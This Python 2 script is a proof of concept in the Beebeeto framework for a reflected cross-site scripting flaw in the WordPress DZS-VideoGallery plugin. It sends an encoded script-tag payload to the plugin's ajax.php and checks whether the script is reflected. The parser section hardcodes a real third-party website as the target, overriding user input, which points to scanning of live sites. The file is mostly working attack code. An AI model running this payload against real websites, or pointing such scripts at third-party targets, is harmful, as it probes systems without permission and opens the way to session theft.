#!/usr/bin/env python
# encoding:utf-8

import re
import random
import string
import requests
import pdb
import os
import urllib
import urllib2
import sys

import json
import traceback

from pprint import pprint
from optparse import OptionParser, OptionGroup

from utils import http

BEEBEETO_STATEMENT = \
    "This POC is created for security research. "\
    "It cannot be used in illegal ways, the user should be responsible for the usage of it."\
    "All Rights Reserved by BeeBeeTo.com."


class BaseFrame(object):
    poc_info = {
        # id/name to be edit by BeeBeeto
        'poc': {
            'id': None,
            'name': None,
            'author': 'Beebeeto',
            'create_date': '2014-07-15',
        },
        # to be edit by you
        'protocol': {
            'name': None,  # 'openssl' e.g.
            'port': None,  # must be int type, 443 e.g.
            'layer4_protocol': ['tcp'],
        },
        # to be edit by you
        'vul': {
            'app_name': None,
            'vul_version': None,
            'type': None,
            'tag': [],
            'desc': None,
            'references': [],
        },
    }

    def __init__(self, run_in_shell=True):

        if run_in_shell:
            self._init_parser()
        self.run_in_shell = run_in_shell

    def _init_parser(self, do_parse=True):
        usage = 'usage: %prog [options] arg1 arg2'
        self.base_parser = OptionParser(usage=usage, description=BEEBEETO_STATEMENT)
        self.user_parser = OptionGroup(self.base_parser,
                                       title='POC Specified Options',
                                       description='These options are specified by the author'
                                                   ' of this poc, so they are available'
                                                   ' only in this poc.')
        self.base_parser.add_option_group(self.user_parser)
        self.__init_base_parser()
        self._init_user_parser()

        if do_parse:
            (self.options, self.args) = self.base_parser.parse_args()
            # self.options.target = 'anchormediastudio.com'
            self.options.target = 'www.evangelistadavidviera.com'
            self.options.verbose = True
            if not self.options.target:
                print '\n[*] No target input!\n'
                self.base_parser.print_help()
                sys.exit()

    def __init_base_parser(self):
        # self.base_parser.add_option('-t', '--target', action='store', dest='target',
        self.base_parser.add_option('-t', '--target', action='store', dest='target',
                                    # default='anchormediastudio.com', help='the target to be checked by this poc.')
                                    default=None, help='the target to be checked by this poc.')
        self.base_parser.add_option('-v', '--verify',
                                    action='store_true', dest='verify', default=True,
                                    help='run poc in verify mode.')
        self.base_parser.add_option('-e', '--exploit',
                                    action='store_false', dest='verify',
                                    help='run poc in exploit mode.')
        self.base_parser.add_option('--verbose', action='store_true', dest='verbose',
                                    default=False, help='print verbose debug information.')
        self.base_parser.add_option('--info', action='callback', callback=self.__cb_print_poc_info,
                                    help='print poc information.')

    def _init_user_parser(self):
        #self.user_parser.add_option('-x', help='example')
        pass

    def __cb_print_poc_info(self, option, opt, value, parser):
        print(json.dumps(self.poc_info, ensure_ascii=False, indent=2))
        sys.exit()

    @classmethod
    def normalize_target(cls, target):
        if cls.poc_info['protocol']['name'] == 'http':
            return http.normalize_url(target)
        elif cls.poc_info['protocol']['name'] == 'https':
            return http.normalize_url(target, https=True)
        else:
            return target

    def run(self, options=None, debug=False):
        options = self.options.__dict__ if self.run_in_shell else options
        options['target'] = self.normalize_target(options['target'])
        args = {
            'options': options,
            'success': False,
            'poc_ret': {},
        }
        result = {}
        try:
            if options['verify']:
                args = self.verify(args)
            else:
                args = self.exploit(args)
            # print 'result:',  result
            # print 'args: ', args
            result.update(args)
        except Exception, err:
            if debug:
                traceback.print_exc()
                sys.exit()
            result.update(args)
            result['exception'] = str(err)
        return result

    @classmethod
    def verify(cls, args):
        '''
        main code here.
        '''
        return args

    @classmethod
    def exploit(cls, args):
        '''
        main code here.
        '''
        return args



class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0195',
            'name': 'WordPress DZS-VideoGallery /ajax.php XSS漏洞 POC',
            'author': '我只会打连连看',
            'create_date': '2014-12-10',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress DZS-VideoGallery',
            'vul_version': [''],
            'type': 'Cross Site Scripting',
            'tag': ['WordPress DZS-VideoGallerye', 'xss漏洞', '/wp-content/plugins/dzs-videogallery/ajax.php', 'php'],
            'desc': '''
                    WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。
                    DZS-VideoGallery是其中的一个DZS视频库插件。
                    WordPress DZS-VideoGallery插件中存在跨站脚本漏洞，该漏洞源于程序没有正确过滤用户提交的输入。
                    当用户浏览被影响的网站时，其浏览器将执行攻击者提供的任意脚本代码，这可能导致攻击者窃取基于cookie的身份认证并发起其它攻击。
                    ''',
            'references': ['http://sebug.net/vuldb/ssvid-61532',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        # verify_url = args['options']['target'] + "/wp-content/plugins/dzs-videogallery/ajax.php"
        payload = {
                "ajax":"true",
                "height":400,
                "width":610,
                "type":"vimeo",
                "source":"%22%2F%3E%3Cscript%3Ealert%28bb2%29%3C%2Fscript%3E"
                }
        payload = urllib.urlencode(payload)
        print payload
        # verify_url = args['options']['target'] + payload
        verify_url = args['options']['target']
        req = urllib2.Request(verify_url, payload)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<script>alert("bb2")</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify




if __name__ == '__main__':
    os.system('clear')
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
